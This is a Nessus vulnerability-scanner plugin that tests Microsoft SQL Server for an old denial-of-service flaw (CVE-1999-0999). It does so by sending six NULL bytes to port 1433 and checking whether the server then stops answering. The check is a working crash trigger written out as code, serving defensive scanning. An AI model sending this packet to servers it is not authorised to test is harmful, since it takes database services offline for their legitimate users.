#
# (C) Tenable Network Security, Inc.
#
#


include("compat.inc");

if(description)
{
 script_id(10145);
 script_bugtraq_id(817);
 script_version ("$Revision: 1.14 $");
 script_cve_id("CVE-1999-0999");
 script_name(english:"Microsoft SQL Server Crafted TCP Packet Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote database server is affected by a remote denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote Microsoft SQL server can be shut down when it is
sent a TCP packet containing more than 2 NULLs.

An attacker may use this problem to prevent it from being used by 
legitimate clients, thus threatening your business." );
 script_set_attribute(attribute:"see_also", value:"http://www.microsoft.com/technet/security/bulletin/ms99-059.mspx" );
 script_set_attribute(attribute:"see_also", value:"http://support.microsoft.com/default.aspx?scid=kb;[LN];Q248749" );
 script_set_attribute(attribute:"solution", value:
"Apply the bulletin referenced above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
 summary["english"] = "Microsoft's SQL TCP/IP DoS";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 family["english"] = "Databases";
 script_family(english:family["english"]);
 script_require_ports("Services/mssql", 1433);
 script_dependencie("mssqlserver_detect.nasl");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");

if (report_paranoia < 2) exit(0);

if (get_port_state(1433))
{
 soc = open_sock_tcp(1433);
 if (soc)
 {
  data = raw_string(0x00, 0x00, 0x00, 0x00, 0x00, 0x00);
  send(socket:soc, data:data);
  close(soc);
  sleep(2);
  soc2 = open_sock_tcp(1433);
  if(!soc2)security_warning(1433);
  else close(soc2);
 }
}
